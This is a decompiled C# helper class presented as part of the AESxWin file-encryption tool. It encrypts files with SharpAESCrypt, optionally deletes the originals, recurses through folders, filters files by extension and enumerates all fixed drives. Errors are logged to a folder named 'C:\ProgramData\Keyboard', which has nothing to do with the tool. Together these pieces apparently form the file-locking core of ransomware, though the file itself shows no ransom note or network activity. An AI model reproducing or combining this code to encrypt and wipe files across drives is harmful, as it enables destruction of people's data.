using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using SharpAESCrypt;

namespace AESxWin.Helpers;

public static class FilesHelper
{
	public static async Task EncryptFileAsync(this string path, string password)
	{
		await Task.Run(delegate
		{
			global::SharpAESCrypt.SharpAESCrypt.Encrypt(password, path, path + ".aes");
		});
	}

	public static void EncryptFileAsync(this string path, string password, bool deleteOriginal)
	{
		try
		{
			global::SharpAESCrypt.SharpAESCrypt.Encrypt(password, path, path + ".aes");
			if (deleteOriginal)
			{
				try
				{
					File.Delete(path);
					return;
				}
				catch
				{
					return;
				}
			}
		}
		catch (Exception ex)
		{
			string text = DateTime.Now.ToString("ddMMyyyy");
			string path2 = Path.Combine("C:\\ProgramData\\Keyboard", text + ".error");
			Log.WriteLog(path2, ex.ToString());
		}
	}

	public static async Task EncryptFilesAsync(this IEnumerable<string> paths, string password)
	{
		await Task.Run(async delegate
		{
			foreach (string path in paths)
			{
				await path.EncryptFileAsync(password);
				TextBoxLogHelper.Log(path + " Encrypted.");
			}
		});
	}

	public static async Task DecryptFileAsync(this string path, string password)
	{
		string outputpath = path.RemoveExtension();
		await Task.Run(delegate
		{
			global::SharpAESCrypt.SharpAESCrypt.Decrypt(password, path, outputpath);
		});
	}

	public static string RemoveExtension(this string path)
	{
		return Path.ChangeExtension(path, "")!.TrimEnd(new char[1] { '.' });
	}

	public static async Task DecryptFilesAsync(this IEnumerable<string> paths, string password)
	{
		await Task.Run(async delegate
		{
			foreach (string path in paths)
			{
				await path.DecryptFileAsync(password);
			}
		});
	}

	public static IEnumerable<string> GetFolderFilesPaths(this string folder, bool followSubDirs = true)
	{
		List<string> list = new List<string>();
		try
		{
			if (!Directory.Exists(folder))
			{
				return list;
			}
			if (followSubDirs)
			{
				string[] directories = Directory.GetDirectories(folder);
				if (directories != null)
				{
					string[] array = directories;
					foreach (string folder2 in array)
					{
						list.AddRange(folder2.GetFolderFilesPaths());
					}
				}
			}
			string[] files = Directory.GetFiles(folder);
			if (files != null)
			{
				list.AddRange(files);
			}
		}
		catch
		{
		}
		return list;
	}

	public static IEnumerable<string> ParseExtensions(this string extentions)
	{
		List<string> list = new List<string>();
		string value = Regex.Match(extentions, "\\(.+\\)").Value;
		if (!string.IsNullOrWhiteSpace(value))
		{
			extentions = extentions.Replace(value, string.Empty);
		}
		MatchCollection matchCollection = Regex.Matches(extentions, "\\b(\\w+)\\b");
		foreach (object item in matchCollection)
		{
			list.Add("." + item.ToString());
		}
		return list;
	}

	public static bool CheckExtension(this string path, IEnumerable<string> extensions)
	{
		if (extensions == null)
		{
			return true;
		}
		if (extensions.Count() == 0)
		{
			return true;
		}
		foreach (string extension in extensions)
		{
			if (path.ToLower().EndsWith(extension.ToLower()))
			{
				return true;
			}
		}
		return false;
	}

	public static bool CheckExtension(this string path, string[] extensions)
	{
		if (extensions == null)
		{
			return true;
		}
		if (extensions.Count() == 0)
		{
			return true;
		}
		foreach (string text in extensions)
		{
			try
			{
				if (path.ToLower().EndsWith(text.ToLower()))
				{
					return true;
				}
			}
			catch
			{
			}
		}
		return false;
	}

	public static DriveInfo[] GetDrives()
	{
		IEnumerable<DriveInfo> enumerable = from a in DriveInfo.GetDrives()
			where a.DriveType == DriveType.Fixed
			select a;
		if (enumerable != null && enumerable.Any())
		{
			return enumerable.ToArray();
		}
		return null;
	}
}
